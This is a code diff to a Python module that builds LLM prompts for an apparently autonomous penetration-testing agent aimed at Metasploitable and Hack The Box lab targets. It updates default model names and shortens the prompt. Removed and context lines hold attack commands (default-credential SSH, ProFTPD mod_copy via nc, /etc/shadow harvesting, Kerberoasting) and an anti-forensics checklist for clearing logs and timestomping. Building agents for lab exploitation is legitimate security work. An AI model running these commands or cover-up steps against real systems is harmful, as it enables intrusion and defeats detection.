@@ -206,7 +206,7 @@ class SmartMentor:
         self,
         llm_client: Any,
         learned_store: Optional[LearnedCommandStore] = None,
-        model: str = "gpt-5.1-codex-mini",
+        model: str = "gpt-5.2-codex",  # Phase 12.1: full reasoning model for all mentor calls
         temperature: float = 0.7,
         max_retries: int = 2
     ):
@@ -271,7 +271,8 @@ class SmartMentor:
         # Phase 9: Web exploitation reference from massive knowledge seed
         try:
             from core.knowledge.massive_knowledge_seed import get_web_attack_reference
-            web_exploit_reference = get_web_attack_reference()
+            _raw = get_web_attack_reference()
+            web_exploit_reference = _raw[:2000] if len(_raw) > 2000 else _raw
         except Exception:
             web_exploit_reference = ""
         
@@ -315,14 +316,7 @@ class SmartMentor:
         except Exception:
             pass
 
-        return f"""You are an expert penetration tester and red team operator with deep knowledge of:
-- Network reconnaissance and enumeration
-- Web application security testing
-- Active Directory attacks and lateral movement
-- Linux and Windows privilege escalation
-- Advanced techniques like port knocking, tunneling, and evasion
-
-Your role is to select the BEST next command for the current attack phase.
+        return f"""You are an expert pentester and red team operator. Select the BEST next command for the current attack phase.
 
 === METASPLOITABLE 2 TARGET KNOWLEDGE ===
 The primary target is Metasploitable 2 (Ubuntu 8.04). Known vulnerable services:
@@ -366,13 +360,6 @@ CRITICAL RULES:
 7. Variety is key - try different approaches if current ones aren't working
 8. For MS2: prefer backdoors (ingreslock, vsftpd, UnrealIRCd) and default creds over brute force
 
-ANTI-LOOP BEHAVIOR:
-- If nmap was already used, try a different scanner (masscan, rustscan)
-- If one web tool failed, try another (gobuster → feroxbuster → dirb)
-- If SSH failed, try SMB or other services
-- NEVER select the same command twice in a row
-- If stuck in RECON, jump to easy exploits: telnet 1524, mysql no-password
-
 OUTPUT FORMAT (JSON only):
 {{
     "intent": "strategic goal of this action",
@@ -387,50 +374,6 @@ OUTPUT FORMAT (JSON only):
         {{"command": "alternative_template_name", "why": "reason"}}
     ]
 }}
-
-=== METASPLOITABLE 3 TARGET KNOWLEDGE (VERIFIED LIVE) ===
-MS3 Docker (kirscht/metasploitable3-ub1404) — ONLY these ports are open:
-
-ACTUAL OPEN SERVICES (verified via nmap):
-  • Port 21/tcp  — ProFTPD 1.3.5 (mod_copy CVE-2015-3306 CONFIRMED)
-  • Port 22/tcp  — OpenSSH 6.6.1p1 (msfadmin:msfadmin WORKS, user in sudo group)
-  • Port 111/tcp — rpcbind 2-4
-  • Port 139/tcp — Samba smbd 3.X-4.X
-  • Port 445/tcp — Samba smbd 3.X-4.X
-  • Port 3306/tcp — MySQL (unauthorized — needs credentials)
-
-PORTS THAT ARE CLOSED (do NOT attack these):
-  • 80, 8080, 8484, 9200, 6667, 23, 25, 53, 5900 — ALL CLOSED
-  • No web server, no Jenkins, no Tomcat, no UnrealIRCd
-
-#1 FASTEST SHELL — SSH DEFAULT CREDS (try FIRST):
-  sshpass -p msfadmin ssh -o StrictHostKeyChecking=no msfadmin@{{target}} id
-  → uid=900(msfadmin) gid=900(msfadmin) groups=900(msfadmin),27(sudo)
-  → msfadmin is in sudo group → sudo su → root!
-  This is the FASTEST path to root on this MS3 Docker.
-
-#2 ProFTPD mod_copy — CVE-2015-3306 (no auth needed):
-  echo -e 'SITE CPFR /etc/passwd\nSITE CPTO /tmp/test' | nc {{target}} 21
-  → 350 File or directory exists → 250 Copy successful
-  Can copy any file anywhere. Use to plant SSH keys or cron jobs.
-
-#3 Samba enumeration:
-  smbclient -L //{{target}} -N → shares: print$, public, IPC$
-  enum4linux -a {{target}} → user enumeration
-
-#4 MySQL (needs valid credentials, try root:sploitme):
-  mysql -h {{target}} -u root -psploitme -e 'show databases'
-
-MS3 OPTIMAL ATTACK CHAIN:
-  1. sshpass -p msfadmin ssh msfadmin@{{target}} id  → instant user shell
-  2. sudo -l → (ALL) → sudo su → root
-  3. cat /etc/shadow → credential harvest
-  4. If SSH blocked: ProFTPD mod_copy → plant SSH key → SSH as root
-  5. Samba enum for lateral info, MySQL for database creds
-
-CRITICAL: vagrant:vagrant does NOT work on this Docker! Use msfadmin:msfadmin.
-CRITICAL: Port 80 is CLOSED. Do NOT run gobuster, nikto, ffuf, wpscan — they will fail.
-CRITICAL: Port 6667 is CLOSED. UnrealIRCd backdoor does NOT exist here.
 
 === HACK THE BOX COMMON PATTERNS ===
 80% of HTB boxes start with web. Master these patterns:
@@ -455,31 +398,9 @@ WINDOWS PRIVESC:
   • Kerberoasting: GetUserSPNs.py → hashcat -m 13100
   • BloodHound: bloodhound-python -c all → find shortest path to DA
 
-=== CLOSEOUT / ANTI-FORENSICS ===
-After exfiltration, ALWAYS close out professionally:
-  1. Remove uploaded tools and payloads from /tmp, /dev/shm
-  2. Remove planted SSH keys from authorized_keys
-  3. Remove cron backdoors
-  4. Clear bash history, auth logs, wtmp/btmp, syslog
-  5. Timestomp modified files to match system baseline
-  6. Verify target stability (uptime, services, disk)
-
-=== FLAG CAPTURE — HIGH PRIORITY ===
-Flags are the ultimate proof of compromise. ALWAYS capture them:
-  • USER FLAG: cat /home/*/user.txt — read immediately after getting user shell
-  • ROOT FLAG: cat /root/root.txt — read immediately after getting root shell
-  • Flag formats: FLAG{{...}}, HTB{{...}}, flag{{...}}, or 32-char hex strings
-  • After obtaining any shell, the FIRST action should be reading the flag file
-  • User flag = proof of initial access, Root flag = proof of full compromise
-
-=== EXPLOIT REASONING METHODOLOGY ===
-Think like a pentester — understand WHY vulnerabilities exist:
-  • DEFAULT CREDENTIALS: Services shipped with known passwords (msfadmin:msfadmin, tomcat:tomcat)
-  • BACKDOORS: Intentionally planted (vsftpd 2.3.4, UnrealIRCd, ingreslock port 1524)
-  • MISCONFIGURATIONS: NFS world-readable, MySQL no-password, writable /etc/passwd
-  • CVEs: Known software bugs (Samba CVE-2007-2447, ProFTPD CVE-2015-3306)
-  • LOOPHOLES: sudo misconfigs, SUID binaries, kernel exploits, Docker group membership
-Chain exploits: identify entry point → escalate privileges → capture flags → exfiltrate
+=== FLAGS ===
+USER: cat /home/*/user.txt | ROOT: cat /root/root.txt | Formats: FLAG{{...}}, HTB{{...}}, 32-hex.
+After ANY shell, read the flag file FIRST.
 
 {ms3_knowledge}
 
@@ -1060,7 +981,7 @@ class DualMentor:
         self,
         gpt_client: Any,
         venice_client: Optional[Any] = None,
-        gpt_model: str = "gpt-5.1-codex-mini",
+        gpt_model: str = "gpt-5.2-codex",  # Phase 12.1: full reasoning model
         venice_model: str = "qwen3-coder-480b-a35b-instruct",
         learned_store: Optional[LearnedCommandStore] = None,
         strategy: str = "gpt_first",
@@ -1073,7 +994,7 @@ class DualMentor:
         Args:
             gpt_client: OpenAI client for GPT
             venice_client: OpenAI-compatible client for Venice
-            gpt_model: GPT model to use
+            gpt_model: GPT model to use (Phase 12.1: default gpt-5.2-codex)
             venice_model: Venice model to use (default: qwen3-coder-480b-a35b-instruct)
             learned_store: Store for learned commands
             strategy: Mentor selection strategy
@@ -1350,7 +1271,7 @@ class DualMentor:
 
 def create_smart_mentor(
     llm_client: Any,
-    model: str = "gpt-5.1-codex-mini",
+    model: str = "gpt-5.2-codex",  # Phase 12.1: full reasoning model
     temperature: float = 0.7
 ) -> SmartMentor:
     """
@@ -1374,7 +1295,7 @@ def create_smart_mentor(
 def create_dual_mentor(
     gpt_client: Any,
     venice_client: Optional[Any] = None,
-    gpt_model: str = "gpt-5.1-codex-mini",
+    gpt_model: str = "gpt-5.2-codex",  # Phase 12.1: full reasoning model
     venice_model: str = "qwen3-coder-480b-a35b-instruct",
     strategy: str = "gpt_first",
     temperature: float = 0.7
